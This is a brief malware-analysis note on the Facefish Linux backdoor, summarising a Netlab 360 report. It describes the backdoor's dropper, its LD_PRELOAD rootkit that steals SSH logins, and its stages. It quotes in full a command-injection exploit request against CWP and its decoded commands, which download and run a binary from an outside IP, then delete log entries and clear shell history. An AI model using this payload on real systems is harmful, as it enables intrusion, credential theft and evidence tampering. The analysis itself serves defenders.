### FACEFISH

- Works as a backdoor for Linux systems exploiting vulnerabilites in CWP, is a x64 exec, Blowfish Encrytion Algo <br>
It consists of 2 parts: a Dropper and a Rootkit where Rootkit defines the main function, works at Ring Layer 3 and is loaded using LD_PRELOAD feature to steal login creds by hooking ssh/sshd program related functions, also supports backdoor functions



## FUNCTIONS
cred stealer, device info stealer, bounce shell, execute arbitrary commands

## WORKING

![](https://blog.netlab.360.com/content/images/2021/05/fish_brief.png)

### METHODS
<code> POST /admin/index.php?scripts=.%00./.%00./client/include/inc_index&service_start=;cd%20/usr/bin;%20/usr/bin/wget%20http://176.111.174.26/76523y4gjhasd6/sshins;%20chmod%200777%20/usr/bin/sshins;%20ls%20-al%20/usr/bin/sshins;%20./sshins;%20cat%20/etc/ld.so.preload;%20rm%20-rf%20/usr/bin/sshins;%20sed%20-i%20'/sshins/d'%20/usr/local/cwpsrv/logs/access_log;%20history%20-c;&owner=root&override=1&api_key=%00%00%C2%90 HTTP/1.1
</code> <br>
Host: xx.xxx.xxx.xx:2031 <br>
User-Agent: python-requests/2.25.1 <br>
Accept-Encoding: gzip, deflate <br>
Accept: */* <br>
Connection: keep-alive <br>
Content-Length: 0 <br>

which gives us 
<code>
  cd /usr/bin; 
/usr/bin/wget http://176.111.174.26/76523y4gjhasd6/sshins; 
chmod 0777 /usr/bin/sshins; 
ls -al /usr/bin/sshins; ./sshins; 
cat /etc/ld.so.preload;
rm -rf /usr/bin/sshins; 
sed -i '/sshins/d' /usr/local/cwpsrv/logs/access_log; 
history -c
</code>

It works in 3 stages:

Stage 0: Preliminary stage, spread through the vulnerability and implanted Dropper on the device

Stage 1: Release stage, Dropper releases the Rootkit

Stage 2: Operational stage, Rootkit collects and transmits back sensitive information and waits for the execution of the instructions issued by C2


the dropper comes with its own set of tasks, chief among them being
• detecting the runtime environment 
• decrypting a configuration file to get C2 information
• configuring the rootkit 
• starting the rootkit by injecting it into the secure shell server process (sshd).





















































### REFERENCES
* [Netlab 360 source](https://blog.netlab.360.com/ssh_stealer_facefish_en/)
